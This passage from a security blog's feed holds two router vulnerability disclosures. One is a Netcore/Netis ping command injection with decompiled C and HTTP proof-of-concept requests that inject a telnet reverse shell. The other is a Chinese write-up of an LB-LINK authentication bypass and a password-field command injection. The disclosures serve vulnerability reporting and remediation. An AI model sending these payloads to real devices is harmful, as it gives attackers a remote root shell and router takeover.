[sp+3Ch] [-68h]</span></span><br><span class="line">  _BYTE *v24; <span class="comment">// [sp+40h] [-64h]</span></span><br><span class="line">  _BYTE *v25; <span class="comment">// [sp+44h] [-60h]</span></span><br><span class="line">  _BYTE *v26; <span class="comment">// [sp+48h] [-5Ch]</span></span><br><span class="line">  _DWORD v27[<span class="number">22</span>]; <span class="comment">// [sp+4Ch] [-58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v27, <span class="number">0</span>, <span class="number">0x50u</span>);</span><br><span class="line">  v5 = a5[<span class="number">1</span>];</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  v6 = _bswapsi2((v5 &lt;&lt; <span class="number">8</span>) | *a5 | (a5[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (a5[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>));</span><br><span class="line">  blobmsg_parse(&amp;stru_412FC4, <span class="number">5</span>, &amp;v22, a5 + <span class="number">4</span>, (v6 &amp; <span class="number">0xFFFFFF</span>) - <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v22 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">    ulog(<span class="number">3</span>, <span class="string">&quot;%s %d data missing.\n&quot;</span>);</span><br><span class="line">    result = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (*v22 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = ((<span class="type">unsigned</span> __int8)v22[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v22[<span class="number">4</span>];</span><br><span class="line">    v19 = &amp;v22[(((<span class="type">unsigned</span> __int16)((v17 &gt;&gt; <span class="number">8</span>) | ((_WORD)v17 &lt;&lt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">4</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v19 = v22 + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v27[<span class="number">0</span>] = v19;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;start&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v24 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v25;</span><br><span class="line">        <span class="keyword">if</span> ( v25 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (*v23 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v18 = ((<span class="type">unsigned</span> __int8)v23[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v23[<span class="number">4</span>];</span><br><span class="line">            v8 = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v23[(((<span class="type">unsigned</span> __int16)(((_WORD)v18 &lt;&lt; <span class="number">8</span>) | (v18 &gt;&gt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">4</span>];</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = (<span class="type">unsigned</span> <span class="type">int</span>)(v23 + <span class="number">4</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v27[<span class="number">1</span>] = v8;</span><br><span class="line">          v9 = v24 + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (*v24 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = ((<span class="type">unsigned</span> __int8)v24[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v24[<span class="number">4</span>];</span><br><span class="line">            v9 = (_DWORD *)((<span class="type">char</span> *)v9 + (((<span class="type">unsigned</span> __int16)((v10 &gt;&gt; <span class="number">8</span>) | ((_WORD)v10 &lt;&lt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          v27[<span class="number">2</span>] = _bswapsi2(*v9);</span><br><span class="line">          v11 = v7 + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (*v7 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v12 = ((<span class="type">unsigned</span> __int8)v7[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v7[<span class="number">4</span>];</span><br><span class="line">            v11 = (_DWORD *)((<span class="type">char</span> *)v11 + (((<span class="type">unsigned</span> __int16)((v12 &gt;&gt; <span class="number">8</span>) | ((_WORD)v12 &lt;&lt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          v27[<span class="number">3</span>] = _bswapsi2(*v11);</span><br><span class="line">          <span class="keyword">if</span> ( v26 )</span><br><span class="line">          &#123;</span><br><span class="line">            v13 = v26 + <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (*v26 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = ((<span class="type">unsigned</span> __int8)v26[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v26[<span class="number">4</span>];</span><br><span class="line">              v13 = (_DWORD *)((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int16)((v14 &gt;&gt; <span class="number">8</span>) | ((_WORD)v14 &lt;&lt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            v15 = _bswapsi2(*v13);</span><br><span class="line">            sub_4019A8(v15, &amp;v27[<span class="number">4</span>], (<span class="type">char</span> *)&amp;v27[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">memset</span>(&amp;v27[<span class="number">4</span>], <span class="number">0</span>, <span class="number">17</span>);</span><br><span class="line">            <span class="built_in">memset</span>((<span class="type">char</span> *)&amp;v27[<span class="number">8</span>] + <span class="number">1</span>, <span class="number">0</span>, <span class="number">46</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;get&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    blob_buf_init(dword_4131A0, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( tools_ping_get(dword_4131A0) &gt;= <span class="number">0</span> )</span><br><span class="line">      result = ubus_send_reply(a1, a3, dword_4131A0[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;end&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ulog(<span class="number">6</span>, <span class="string">&quot;ping end\n&quot;</span>);</span><br><span class="line">LABEL_18:</span><br><span class="line">    result = tools_ping((<span class="type">int</span>)v27);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line">  ulog(<span class="number">3</span>, <span class="string">&quot;%s %d data missing.\n&quot;</span>);</span><br><span class="line">  result = <span class="number">9</span>;</span><br><span class="line">LABEL_23:</span><br><span class="line">  <span class="keyword">if</span> ( _stack_chk_guard != v27[<span class="number">20</span>] )</span><br><span class="line">    _stack_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Inside <code>tools_ping()</code>, the command is constructed using:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(v4, <span class="number">0x80u</span>, <span class="string">&quot;(ping %s -c %d -s %d &gt; %s; touch %s)&amp;&quot;</span>, ...);  </span><br></pre></td></tr></table></figure><p>This concatenates the <code>url</code>, <code>count</code>, and <code>size</code> values into <code>v4</code>, which is executed via <code>system(v4);</code>. <strong>A command injection vulnerability exists here</strong> because there is no <strong>validation check</strong> for the user-provided <code>url</code> input.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">tools_ping</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">128</span>]; <span class="comment">// [sp+3Ch] [-88h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+BCh] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*(<span class="type">const</span> <span class="type">char</span> **)a1, <span class="string">&quot;start&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ping_end();</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(</span><br><span class="line">        v4,</span><br><span class="line">        <span class="number">0x80u</span>,</span><br><span class="line">        <span class="string">&quot;(ping %s -c %d -s %d -I %s &gt; %s; touch %s)&amp;&quot;</span>,</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">4</span>),</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">8</span>),</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">12</span>),</span><br><span class="line">        a1 + <span class="number">16</span>,</span><br><span class="line">        <span class="string">&quot;/tmp/ping.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/tmp/.ping_end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">33</span>) )</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v4,</span><br><span class="line">          <span class="number">0x80u</span>,</span><br><span class="line">          <span class="string">&quot;(ping %s -c %d -s %d -I %s &gt; %s; touch %s)&amp;&quot;</span>,</span><br><span class="line">          v2,</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">8</span>),</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">12</span>),</span><br><span class="line">          a1 + <span class="number">33</span>,</span><br><span class="line">          <span class="string">&quot;/tmp/ping.txt&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/tmp/.ping_end&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v4,</span><br><span class="line">          <span class="number">0x80u</span>,</span><br><span class="line">          <span class="string">&quot;(ping %s -c %d -s %d &gt; %s; touch %s)&amp;&quot;</span>,</span><br><span class="line">          v2,</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">8</span>),</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">12</span>),</span><br><span class="line">          <span class="string">&quot;/tmp/ping.txt&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/tmp/.ping_end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ping_end();</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( _stack_chk_guard != v5 )</span><br><span class="line">    _stack_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="III-POC-Explanation"><a href="#III-POC-Explanation" class="headerlink" title="III. POC Explanation"></a>III. POC Explanation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /ubus HTTP/1.1</span><br><span class="line">Host: 192.168.50.2</span><br><span class="line">Content-Length: 211</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://192.168.50.2</span><br><span class="line">Referer: http://192.168.50.2/diagnosis.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:20,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;b80717ca0f9be34ba9ad970dd0d5891c&quot;,&quot;network_tools&quot;,&quot;tools_ping&quot;,&#123;&quot;command&quot;:&quot;ping&quot;,&quot;wanid&quot;:1,&quot;url&quot;:&quot;);mkfifo /tmp/test;(&quot;,&quot;count&quot;:5,&quot;size&quot;:64,&quot;action&quot;:&quot;start&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /ubus HTTP/1.1</span><br><span class="line">Host: 192.168.50.2</span><br><span class="line">Content-Length: 211</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://192.168.50.2</span><br><span class="line">Referer: http://192.168.50.2/diagnosis.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:20,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;b80717ca0f9be34ba9ad970dd0d5891c&quot;,&quot;network_tools&quot;,&quot;tools_ping&quot;,&#123;&quot;command&quot;:&quot;ping&quot;,&quot;wanid&quot;:1,&quot;url&quot;:&quot;);telnet 192.168.50.1 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test;(&quot;,&quot;count&quot;:5,&quot;size&quot;:64,&quot;action&quot;:&quot;start&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><p><code>snprintf(v4, 0x80u, &quot;(ping %s -c %d -s %d &gt; %s; touch %s)&amp;&quot;, ...);</code></p><p>Since <code>snprintf</code> will truncate the string if it exceeds 80 bytes, the reverse shell command needs to be split. As there is no character filtering applied to the <code>url</code>, it can be replaced with any arbitrary command.</p><p>Demonstration of remote shell access:</p><p><img src="/image/CVE-2025-5147/1746698400088.png" alt="1746698400088"></p><h2 id="IV-Recommended-Solution"><a href="#IV-Recommended-Solution" class="headerlink" title="IV. Recommended Solution"></a>IV. Recommended Solution</h2><p>It is recommended to add a character legitimacy check for the URL.</p><p><strong>Discoverer: Exploo0Osion.</strong></p><p><strong>Please contact Netcore (Netis Technology) technical support to fix this vulnerability in a timely manner.</strong></p>]]></content>
      
      
      <categories>
          
          <category> router </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2025-10286</title>
      <link href="/2025/04/04/2025-04-4-CNVD-2025-10286/"/>
      <url>/2025/04/04/2025-04-4-CNVD-2025-10286/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="多款LB-LINK路由器存在未授权访问漏洞"><a href="#多款LB-LINK路由器存在未授权访问漏洞" class="headerlink" title="多款LB-LINK路由器存在未授权访问漏洞"></a>多款LB-LINK路由器存在未授权访问漏洞</h1><p>漏洞涉及路由器固件有：</p><p>BL-G1200_V2.0(V1.0.20)升级固件</p><p>BL-AX5400P(V1.0.19)升级固件</p><p>BL-AX1800(V1.0.19)升级固件</p><p>BL-AC3600(V1.0.22)升级固件</p><p>BL-AC2600(V1.0.22)升级固件</p><p>BL-X-PRO_V2.0(V1.0.22)升级固件</p><p>固件来源于官方：<a href="https://www.b-link.net.cn/downloads_16.html">下载中心_必联（LB-LINK）官方网站</a></p><h2 id="一、漏洞衍生的危害"><a href="#一、漏洞衍生的危害" class="headerlink" title="一、漏洞衍生的危害"></a>一、漏洞衍生的危害</h2><h3 id="1-未授权信息泄露"><a href="#1-未授权信息泄露" class="headerlink" title="1.未授权信息泄露"></a>1.未授权信息泄露</h3><p>几乎所有的向 <code>lighttpd.cgi</code>发送的调用函数请求都可以未授权访问，包括 <code>setmanpwd</code>（篡改路由器登录界面密码）、<code>getmanpwd</code>（获取路由器当前登录密码）、<code>getrouterinfo</code>（获取路由信息）、<code>set_remote_manage</code>（开启远程web访问）等等。攻击者只需控制请求中 <code>type</code>字段的函数名称和其他字段便可达成攻击，所有POC均会放在 <code>/POC</code>文件夹中。</p><h4 id="篡改路由器登录界面密码"><a href="#篡改路由器登录界面密码" class="headerlink" title="篡改路由器登录界面密码"></a>篡改路由器登录界面密码</h4><p><img src="/image/CNVD-2025-10286/1743735892380.png" alt="1743735892380"></p><h4 id="获取路由器当前登录密码"><a href="#获取路由器当前登录密码" class="headerlink" title="获取路由器当前登录密码"></a>获取路由器当前登录密码</h4><p><img src="/image/CNVD-2025-10286/1743735978950.png" alt="1743735978950"></p><h4 id="获取路由信息"><a href="#获取路由信息" class="headerlink" title="获取路由信息"></a>获取路由信息</h4><p><img src="/image/CNVD-2025-10286/1743750266465.png" alt="1743750266465"></p><h4 id="开启远程web访问"><a href="#开启远程web访问" class="headerlink" title="开启远程web访问"></a>开启远程web访问</h4><p><img src="/image/CNVD-2025-10286/1743736258710.png" alt="1743736258710"></p><p><img src="/image/CNVD-2025-10286/1743736252997.png" alt="1743736252997"></p><h3 id="2-未授权远程命令执行（命令注入）"><a href="#2-未授权远程命令执行（命令注入）" class="headerlink" title="2.未授权远程命令执行（命令注入）"></a>2.未授权远程命令执行（命令注入）</h3><p>在 <code>libblinkapi.so</code>的 <code>bs_setmanpwd</code>函数中存在命令注入漏洞，从而可以远程命令执行，获取路由器最高权限。</p><p><img src="/image/CNVD-2025-10286/1743736897631.png" alt="1743736897631"></p><h2 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h2><h3 id="1-认证绕过"><a href="#1-认证绕过" class="headerlink" title="1.认证绕过"></a>1.认证绕过</h3><p>在 <code>/etc/lighttpd/lighttpd.conf</code>中，请求的 URL 以 <code>/cgi-bin</code> 开头时，不管文件扩展名是什么，都当作 CGI 脚本并使用系统默认解释器执行。</p><p><img src="/image/CNVD-2025-10286/1743750283666.png" alt="1743750283666"></p><p>在 <code>/www/cgi-bin/lighttpd.cgi</code>的 <code>main</code>函数中，会先执行 <code>check_auth</code>函数检查请求中 <code>Authorization</code>字段，再进入 <code>share_func</code>函数。</p><p><img src="/image/CNVD-2025-10286/1743750298212.png" alt="1743750298212"></p><p>在 <code>/usr/lib/libblinkapi.so</code>的 <code>check_auth</code>函数中，错误的使用 <code>strstr</code>函数进行鉴权，攻击者只需使用 <code>/tmp/token</code> 中存在的一个字符，并设置在请求的 <code>Authorization</code>字段中便可进行绕过， <code>v1</code>为用户登录过后留下的 <code>token</code>，保存在 <code>/tmp/token</code>中，a1是攻击者请求中 <code>Authorization</code>字段。<code>share_fuc</code>会处理请求的内容将type字段的函数名交给其他函数进行处理。</p><p>（下面IDA反编译代码经过自写的脚本进行重命名，脚本会防止在 <code>/origin_file</code>文件夹下）</p><p><img src="/image/CNVD-2025-10286/1743750308254.png" alt="1743750308254"></p><h3 id="2-命令注入"><a href="#2-命令注入" class="headerlink" title="2.命令注入"></a>2.命令注入</h3><p>在 <code>/usr/lib/libblinkapi.so</code>的bs_SetManPwd函数中</p><p><code>v39</code>是经过前面处理得到的routepwd中的字符串，通过 <code>snprintf</code>拼接成 <code>chpasswd.sh root v39</code>的形式，然后直接执行 <code>system</code>。请求中的 <code>routepwd</code>类的值并未经过校验（校验功能经测试在前端）。</p><p><img src="/image/CNVD-2025-10286/1743750334483.png" alt="1743750334483"></p><p>通过对反编译代码的分析，攻击者的请求中需包含 <code>“cfg_type”</code>类（即反编译代码中v9）方能进入system所在的if分支。</p><p>（部分反编译代码如下，同样经过脚本进行重命名）</p><p>image<img src="/image/CNVD-2025-10286/1743750426122.png" alt="1743750426122"></p><p><img src="/image/CNVD-2025-10286/1743750379015.png" alt="1743750379015"></p><h2 id="三、详细过程"><a href="#三、详细过程" class="headerlink" title="三、详细过程"></a>三、详细过程</h2><p><a href="https://github.com/Exploo0Osion/LB-Link_unauth">https://github.com/Exploo0Osion/LB-Link_unauth</a></p>]]></content>
      
      
      <categories>
          
          <category> router </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
